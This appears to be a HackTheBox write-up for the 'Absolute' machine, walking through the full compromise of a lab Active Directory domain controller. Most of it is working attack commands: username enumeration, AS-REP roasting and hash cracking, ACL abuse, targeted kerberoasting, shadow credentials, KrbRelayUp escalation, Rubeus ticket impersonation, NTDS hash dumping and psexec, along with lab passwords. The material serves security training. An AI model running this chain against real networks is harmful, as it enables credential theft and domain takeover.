# HackTheBox - Absolute

## NMAP

```bash
Nmap scan report for 10.10.11.181                                                                                                    
Host is up (0.11s latency).                                            
Not shown: 65508 closed ports                                                                                                                 
PORT      STATE SERVICE       VERSION                                
53/tcp    open  domain?                                                
| fingerprint-strings:    
|   DNSVersionBindReqTCP:                                              
|     version                                                          
|_    bind                                                             
80/tcp    open  http          Microsoft IIS httpd 10.0                 
| http-methods:                                                        
|   Supported Methods: OPTIONS TRACE GET HEAD POST                 
|_  Potentially risky methods: TRACE                                                                                                          
|_http-server-header: Microsoft-IIS/10.0                                                                                                      
|_http-title: Absolute                                                                                                                        
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-25 02:06:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC                    
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Issuer: commonName=absolute-DC-CA 
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T08:14:24
| Not valid after:  2023-06-09T08:14:24
| MD5:   bfc0 67ac a80d 4a43 c767 70e3 daac 4089
|_SHA-1: d202 0dbd 811c 7e36 ad9e 120b e6eb a110 8695 f3f7
|_ssl-date: 2022-09-25T02:08:58+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Issuer: commonName=absolute-DC-CA 
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Issuer: commonName=absolute-DC-CA 
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-06-09T08:14:24
| Not valid after:  2023-06-09T08:14:24
| MD5:   bfc0 67ac a80d 4a43 c767 70e3 daac 4089
|_SHA-1: d202 0dbd 811c 7e36 ad9e 120b e6eb a110 8695 f3f7
|_ssl-date: 2022-09-25T02:08:58+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.absolute.htb
| Issuer: commonName=absolute-DC-CA 
| Public Key type: rsa
| Public Key bits: 2048
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
54894/tcp open  msrpc         Microsoft Windows RPC
```

## PORT 445 (SMB)

Checking for anonymous login for smb share but it doesn't list any shares

![](https://i.imgur.com/ntjvx51.png)


## PORT 80 (HTTP)

![](https://i.imgur.com/2rMcfsb.png)

The site only shows a static page with nothing to interact it, so fuzzing for files and directories with `gobuster`

![](https://i.imgur.com/9WmSoEL.png)

So now fuzzing for subdomain or vhost with `wfuzz`

![](https://i.imgur.com/T9bWBxM.png)

This didn't find anything, going back to the site, we can see that there are some images which doesn't show anything meaningful but if check the exif data it does reveal usernames

![](https://i.imgur.com/Y56OqgJ.png)

![](https://i.imgur.com/nng4FjW.png)

We can try grabbing the usernames from all images using exiftool with oneliner

```bash
exiftool *.jpg | grep Author | awk {'print $3,$4'}
```

![](https://i.imgur.com/k6NlwGy.png)

We have usernames but we need to figure out which format is used for usernames on the domain like the username could be in format of firstname.lastname, first initial.lastname and so on for that I used a tool called `Username Anarchy`

```bash
username-anarchy -i ./names.txt -f firstlast,first.last
```

![](https://i.imgur.com/y1CdnG7.png)

Now that have the usernames in format, we can use `kerbrute` to see which usernames exist in domain if we have generated the names in a proper format

```bash
kerbrute userenum ./generated_names.txt -d absolute.htb --dc 10.10.11.181 
```

![](https://i.imgur.com/7bqxyBf.png)

From the output we can see kerbrute tried to authenticate and it found `d.klay` doesn't have pre-authentication enabled which led to AS-REP roasting, before we go cracking this hash, `hashcat` doesn't support cracking etype 18 so we need to use impacket's `GetNPUsers`

```bash
python3 GetNPUsers.py absolute.htb/uwu@dc.absolute.htb -
erated_names.txt -request
```

![](https://i.imgur.com/mVaCYRX.png)

This hash can now be cracked with hashcat as it supports etype 23

```bash
hashcat -a 0 -m 18200 ./hash.txt /opt/SecLists/Passwords/rockyou.txt --force
```

![](https://i.imgur.com/yFa7eLp.png)

I tried using the credentials on rpc and smb but got an account restriction error

![](https://i.imgur.com/kFWruj9.png)

Credentials didn't worked on ldap as well, I tried password spraying which should that none of the valid usernames are allowed on smb

![](https://i.imgur.com/1HLvrNo.png)

So this could mean that NTLM authentication is disabaled, let's try using kerberos based authentication and for that we'll need d.klay's TGT with `getTGT` from impacket script

```
python3 getTGT.py absolute.htb/d.klay
```

![](https://i.imgur.com/509MpG1.png)

Now using `smbclient.py` from impacket we can perform kerberos authentication to list shares

```bash
python3 smbclient.py absolute.htb/d.klay@dc.absolute.htb -k -no-pass -debug
```

![](https://i.imgur.com/O84gRGa.png)

But it shows a clock skew error which means that we need to synchronize our time with domain controller

```bash
sudo ntpdate 10.10.11.181
```

![](https://i.imgur.com/iLWoZiK.png)

![](https://i.imgur.com/oANdbkU.png)

The only shares that were accessible by this user were `NETLOGON` and `SYSVOL` which doesn't seem to have anything interesting, logging in through `rpcclien` with kerberos auth by setting up krb5.conf 

```bash
[libdefaults] default_realm = ABSOLUTE.HTB

[realms]
        ABSOLUTE.HTB = {
                kdc = 10.10.11.181
        }
```

![](https://i.imgur.com/cqoF2F7.png)

`
We can get more users through `enumdomusers`

```bash
rpcclient -U absolute.htb/d.klay dc.absolute.htb -k
```

![](https://i.imgur.com/2iCHxiZ.png)

I checked if there wasn't pre-auth flag set on the new users we got

![](https://i.imgur.com/PX9y14U.png)

Which wasn't the case, I decided to go back and check ldap through kerberos auth and neede to update cme as it was giving an error on ldap 

![](https://i.imgur.com/nUl4KK6.png)


![](https://i.imgur.com/PE9dmVj.png)

Now checking if we can access ldap

![](https://i.imgur.com/R0LuaB2.png)

```bash
poetry run crackmapexec ldap 10.10.11.181 -k --kdcHost dc.absolute.htb --users
```

![](https://i.imgur.com/eTj9DEB.png)

We have the password for `svc_smb` user which is `AbsoluteSMBService123!`, we need to generate TGT again for this user to access smb and see which shares we can access now

![](https://i.imgur.com/f6XY8fd.png)

Listing shares with cme we can see that this user can acess `Shared`

![](https://i.imgur.com/3V3W547.png)

From shared, we see two files

![](https://i.imgur.com/ggZxzp2.png)

![](https://i.imgur.com/GCFFiiw.png)

From `compile.sh` it seems that it's compiled in nim

![](https://i.imgur.com/RpOZCZg.png)

Running the exe on windows machine, it doesn't show any output

![](https://i.imgur.com/RhkioIK.png)
Adding host name in `c:\windows\system32\drivers\etc\hosts`

![](https://i.imgur.com/GpEoIbj.png)

After adding the hostname, if we check wireshark after running the exe, we'll see that it's try to connect to LDAP using credentials

![](https://i.imgur.com/WEqDfZq.png)

On opening the packet, we'll get the password for `m.lovegod` which is `AbsoluteLDAP2022!`

![](https://i.imgur.com/kl0A92u.png)

This user didn't gave us any special access, so having no hope on moving forward JazzPizazz showed a ray of hope

![](https://i.imgur.com/8LYuVHe.png)


```bash
python3 bloodhound.py -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb  -no-pass -c
 all -ns 10.10.11.181
```

![](https://i.imgur.com/O5d81iO.png)

This worked and we have domain data which we can import it on bloodhound

![](https://i.imgur.com/1v9hETl.png)

Checking in which group is m.lovegod part of

![](https://i.imgur.com/Ci8IgXb.png)

Here we see that he is a member of three groups where `Networkers` looks like a custom group, if we enumerate this group

![](https://i.imgur.com/mn4Nmae.png)

It has `WriteOwner` permissions on `Network Audit` object, further looking into that group it has `GenericWrite` on `winrm_user`

![](https://i.imgur.com/uBk55ep.png)

So the path we need to follow is, m.lovegod is a part of networkers group and has WriteOwner ACL, we can become owner of that grouup,and grant permissions to add members in Network Audit group and then we can add a SPN to winrm_user and then kerberoast it which is known as targeted kerberoasting.

But the problem is we don't have a shell and for doing that we need powerview or ADModule so I tried powerview.py and ldap_shell but they didn't worked but `ldapsearch` was workig and we see keycredential properpty which we abuse as well

```bash
ldapsearch -LLL -Y GSSAPI -H ldap://dc.absolute.htb -b "dc=absolute,dc=htb"
```

![](https://i.imgur.com/GBfR9AX.png)



I saw a tweet from `Shutdown` which gave me hope again

![](https://i.imgur.com/Fr0fa9i.png)

Further digging into it, I found a resource for abusing WriteOwner using the author's script 

![](https://i.imgur.com/gkAUGRS.png)

But this script isn't merged with the current impacket repo, so we need to create a python virtual environment and install impacket so that it doesn't mess up with the current impacket installed

![](https://i.imgur.com/F7lCpWm.png)

Having the virutal environment created clone the repo 

```bash
git clone --branch dacledit https://github.com/ShutdownRepo/impacket.git
```

![](https://i.imgur.com/cE5itl9.png)

Copy the `owneredit.py` by from owneredit branch and install impacket

![](https://i.imgur.com/cJIdNC2.png)

Once it's installed with `owneredit` we are going to make m.lovegod the owner of network audit group

```bash
python3 ./owneredit.py -action write -target 'NETWORK AUDIT' -new-owner 'm.lovegod' 'absolute.htb'/'m.lovegod' -k -no-pass -dc-ip 10.10.11.181
```

![](https://i.imgur.com/sAi9OD3.png)

Now being the owner of aduit group we can give full control to m.lovegod to do anything with the group like adding group members so that m.lovegod can have generic write on win_rm user

```bash
python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'm.lovegod' -target 'NETWORK AUDIT' 'absolute.htb'/'m.lovegod' -k -no-pass -dc-ip 10.10.11.181
```

![](https://i.imgur.com/0iLFSjv.png)

All that is left is to add m.lovegod to audit group with `net rpc`

```bash
net rpc group addmem 'Network Audit' 'm.lovegod' -U absolute.htb/m.lovegod -S dc.absolute.htb -k
```

![](https://i.imgur.com/tzVcJ6R.png)

We need to get the TGT again as the permissions or configurations will be revoked

![](https://i.imgur.com/4wjacGM.png)

With `targeted kerberoasting ` we can add SPN to winrm_user and request for a TGS

```bash
python3 ./targetedKerberoast.py -d absolute.htb  -u m.lovegod --dc-ip 10.10.11.181 -k --no-pass -v
```

![](https://i.imgur.com/1ycMbBy.png)

But this hash was not crackable

All this could be done with windows as well machine and synchronized time with DC, we can do it with `w32tm` but we do need to start the service

```powershell
net start w32time
w32tm /config /manualpeerlist:dc.absolute.htb /syncfromflags:MANUAL /reliable:yes /update
```

![](https://i.imgur.com/jI7tbes.png)

Now having synchronzied with the domain controller we can use `PowerView` but for that we needed to make some configurations in host file and the openvpn adapter because without that it won't work properly and will show this 

```powershell
$SecPassword = ConvertTo-SecureString 'AbsoluteLDAP2022!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('absolute.htb\m.lovegod', $SecPassword)
```

![](https://i.imgur.com/DS2mPsC.png)

So to make this work we need to add the domain controller's IP as the DNS server in openvpn adapter's settings

![](https://i.imgur.com/1HEV4DZ.png)

![](https://i.imgur.com/bwMXO9C.png)

Make sure dc.absolute.htb isn't in the hosts file

![](https://i.imgur.com/whQ41Ed.png)

And now our powerview commands will work

![](https://i.imgur.com/3SuqE0Q.png)

Since I am on a windows machine and I had previously made m.lovegod the owner of network audit group but I did that on linux and a day was passed since I had done that so chances are that might have been revoked so I'll just do that powerview

```powershell
Set-DomainObjectOwner -Credential $Cred -Identity "NETWORK AUDIT" -OwnerIdentity "m.lovegod" -Domain 'absolute.htb'-DomainController dc.absolute.htb -V
```

![](https://i.imgur.com/0d9nZdm.png)

Now giving him the full control again 

```powershell
Add-DomainObjectAcl -TargetIdentity "NETWORK AUDIT" -PrincipalIdentity m.lovegod -Rights All -Verbose -Credential $Cred -Domain 'absolute.htb'
```

![](https://i.imgur.com/334mceC.png)

Now adding m.lovegod in network audit's group so that we can abuse generic write by doing targeted kerberoasting 

```powershell
Add-DomainGroupMember -Identity 'NETWORK AUDIT' -Members 'm.lovegod' -Domain 'absolute.htb' -Credential $Cred -Verbose
```

![](https://i.imgur.com/jX0KLaE.png)

We can verfiy if m.lovegod is added in the group

![](https://i.imgur.com/mnC25RN.png)

Now when setting the SPN for winrm_user, it wasn't working probably because of clean up script doing their job but not really sure why it didn't worked as I was providing the command one after the other

```powershell
Set-DomainObject -Identity 'winrm_user' -Set @{serviceprincipalname='MSSQL/UwU'} -Domain 'absolute.htb' -DomainController dc.absolute.htb -Credential $Cred -Verbose
```

![](https://i.imgur.com/pAbw54Q.png)

So what we can do is, repeat the same process by making m.lovegod the owner of audit group, give full control, add m.lovegod into the audit group and then generate TGT, this will reatiain the configurations or the session regardless of what we have configured being removed

![](https://i.imgur.com/tXZTlQj.png)

Checking if the ticket has been loaded

![](https://i.imgur.com/qjdBByB.png)

Running `targetedkerberosat` to set a SPN on winrm_user

![](https://i.imgur.com/mXppjQY.png)

```bash
python3 ./targetedKerberoast.py -d absolute.htb -k --no-pass --dc-ip 10.10.11.181 --request-user winrm_user -vv
```

![](https://i.imgur.com/G46bMhM.png)

From the ldapsearch we can see that there's credential key set, well we can edit the properties in GenericWrite so we can add that as well with `pywhisker` this will update or create `msDS-KeyCredentialLink`  which is related to ADCS realm

```bash
python3 ./pywhisker.py -a add --dc-ip 10.10.11.181 -d absolute.htb -u 'm.lovegod' -k --no-pass -t winrm_user
```

![](https://i.imgur.com/FrCu8Pd.png)

Following PKINIT tools we can request for a TGT and then with that we can get the NTHash but for that we need to have `minikerberos` installed
![]()
![](https://i.imgur.com/xyBOecb.png)

```bash
python3 ./gettgtpkinit.py -cert-pfx ../pywhisker/luUEOlxx.pfx -pfx-pass p9nq1oiCzfgRbOWKMZWQ absolute.htb/winrm_user winrm_user.ccache
```

![](https://i.imgur.com/yWopUeR.png)

Export the TGT ticket

![](https://i.imgur.com/VUrQynT.png)

```bash
python3 ./getnthash.py -key 1b9d937e95c70cc1dd37ad5c67be8d6ff7617fb8438d012236e0f4b3e1cb1e91 absolute.htb/winrm_user
```
![](https://i.imgur.com/zVrMzSq.png)

This can also be doing through rubeus by transferring the pfx file and asking for a tgt with the nthash

```powershell
Rubeus.exe asktgt /user:winrm_user /certificate:luUEOlxx.pfx /password:p9nq1oiCzfgRbOWKMZWQ /domain:absolute.htb /domaincontroller:dc.absolute.htb /getcredentials /show
```

![](https://i.imgur.com/Qo59peP.png)

![](https://i.imgur.com/abQbtm1.png)

We can't really do much with the NThash but thet TGT can be helpful, we can use that on WinRM to get a shell for that I found a ruby script which works with kerberos for winrm 

![](https://i.imgur.com/uCDBKtw.png)

After cloning the repo we will run into a problem

```ruby
winrm_kerb_shell.rb -s dc.absolute.htb -r ABSOLUTE.HTB
```

![](https://i.imgur.com/mWXz28C.png)

This can be resolved by following this which tells to add the domain name in capital in the hosts file

![](https://i.imgur.com/HXYozME.png)

https://github.com/edenhill/librdkafka/issues/2117

Now the script will work perfectly

![](https://i.imgur.com/oInh9gY.png)

After authenticating with winrm service this will save the service principal for winrm and we can use evil-winrm

![](https://i.imgur.com/oWA6QYP.png)

```powershell
evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB
```

![](https://i.imgur.com/6wPhpQZ.png)

We can run winpeas on the machine since defender is disabled and on running we'll see that it shows system is vulnerable to krbrealyUP

![](https://i.imgur.com/TiWLKJN.png)

![](https://i.imgur.com/h08vCy7.png)

We can abuse this by following this post 

https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html
https://github.com/Dec0ne/KrbRelayUp

To comiple krblreayup we need vs studio, after compiling we can transfer the executable on the target machine

![](https://i.imgur.com/kIWdAb1.png)

By following the blog post we can abuse shadowcredentials through Krbrelayup, on running that it wasn't able to execute probably we need other cls ID

![](https://i.imgur.com/z5GZxHg.png)

We can check for differenet clsids from here https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/

![](https://i.imgur.com/Y2XIBGG.png)

![](https://i.imgur.com/JCge5UU.png)


This time we get an access denied so we have gotten the clsid correct but it isn't accessible so probably we'll need a different user to run this exe with like m.lovegod. But issue was running exe with a different user was pain as I tried Invoke-Command and some Runas scripts which didn't worked but the one which did work was `RunasCS` 

https://github.com/antonioCoco/RunasCs
```bash
RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb 'C:\Users\winrm_user\Documents\KrbRelayUp.exe full -m shadowcred --ForceShadowCred -cls 3c6859ce-230b-48a4-be6c-932c0c202048' -l 9
```

![](https://i.imgur.com/ALa3zV3.png)

Now using Rubeus to get TGT for `DC$` machine account with the generated certificate 

```bash
.\Rubeus.exe asktgt /user:DC$ /certificate:cert /password:password /enctype:AES256 /nowrap
```

![](https://i.imgur.com/DxtSE9f.png)

Having the ticket we can now impersonate as the administrator user with a S4U

```bash
.\Rubeus.exe s4u /self /user:DC$ /impersonateuser:administrator /msdsspn:host/dc.absolute.htb /ticket:kirbi_ticket
```

![](https://i.imgur.com/YvaDXmg.png)

Converting the administrator's .kirbi ticket to ccache so that we can use it with impacket scripts

```bash
echo "kirbiticket" | base64 -d > kirbiticket.kirbi
```

![](https://i.imgur.com/3mZZRol.png)

Converting it into ccache ticket with `ticketconverter`

```bash
ticketConverter.py kirbiticket.kirbi ticket.ccache
```

![](https://i.imgur.com/9AgazpC.png)

![](https://i.imgur.com/uc18v2a.png)

Having the administrator's TGT we can dump the SAM and NTDS.dit hashes

```bash
secretsdump.py absolute.htb/administrator@dc.absolute.htb -k -no-pass
```

![](https://i.imgur.com/VXZrWH2.png)

And can use any of the execs from impacket, I used `psexec` to get a shell

```bash
psexec.py -k -no-pass absolute.htb/administrator@dc.absolute.htb 
```
![](https://i.imgur.com/vzsH139.png)

## References

- https://github.com/urbanadventurer/username-anarchy
- https://hashcat.net/wiki/doku.php?id=example_hashes
- https://python-poetry.org/docs/#installing-with-the-official-installer
- https://wiki.porchetta.industries/getting-started/installation/installation-on-unix
- https://itnursery.com/ldapsearch-and-kerberos-authentication/
- https://twitter.com/PizazzJazz/status/1574360409846337537?t=uQ32qRfo2Cl5M5lCDJCGuA&s=19
- https://github.com/jazzpizazz/BloodHound.py-Kerberos
- https://www.thehacker.recipes/ad/movement/dacl/grant-rights
- https://www.thehacker.recipes/ad/movement/dacl/grant-ownership
- https://twitter.com/_nwodtuhs/status/1525527323667218432?lang=en
- https://github.com/ShutdownRepo/impacket/tree/owneredit
- https://github.com/ShutdownRepo/impacket/tree/dacledit
- https://community.spiceworks.com/how_to/160048-work-with-ntp-via-powershell
- https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting
- https://github.com/ShutdownRepo/pywhisker
- https://github.com/dirkjanm/PKINITtools
- https://github.com/skelsec/minikerberos
- https://github.com/edenhill/librdkafka/issues/2117
- https://forum.hackthebox.com/t/simple-winrm-shell-via-kerberos/1870
- https://stackoverflow.com/questions/18760281/how-do-i-increase-the-scrollback-buffer-size-in-tmux
- https://github.com/DarkCoderSc/run-as
- https://notes.vulndev.io/notes/redteam/payloads/windows
- https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html
- https://github.com/Dec0ne/KrbRelayUp
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
- https://github.com/antonioCoco/RunasCs
- https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/
